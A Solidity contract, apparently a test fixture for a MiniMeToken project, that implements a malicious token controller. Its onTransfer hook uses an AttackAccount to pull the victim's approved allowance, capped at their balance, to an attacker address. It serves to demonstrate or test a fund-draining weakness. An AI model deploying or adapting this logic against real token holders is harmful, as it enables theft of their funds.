// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import { TokenController } from "../../contracts/TokenController.sol";
import { MiniMeToken } from "../../contracts/MiniMeToken.sol";
import { AttackAccount } from "./AttackAccount.sol";

contract AttackController is TokenController {
    address public attackerEOA;
    AttackAccount public attackAccount;

    constructor(address _attackerEOA, AttackAccount _attackAccount) {
        attackAccount = _attackAccount;
        attackerEOA = _attackerEOA;
    }

    function proxyPayment(address) public payable override returns (bool) {
        return true;
    }

    function onTransfer(address _from, address, uint256) public override returns (bool) {
        uint256 allowance = MiniMeToken(payable(msg.sender)).allowance(_from, address(attackAccount));
        uint256 balance = MiniMeToken(payable(msg.sender)).balanceOf(_from);
        if (allowance > 0) {
            if (allowance > balance) {
                attackAccount.attack(_from, attackerEOA, balance);
            } else {
                attackAccount.attack(_from, attackerEOA, allowance);
            }
        }
        return true;
    }

    function onApprove(address, address, uint256) public pure override returns (bool) {
        return true;
    }
}
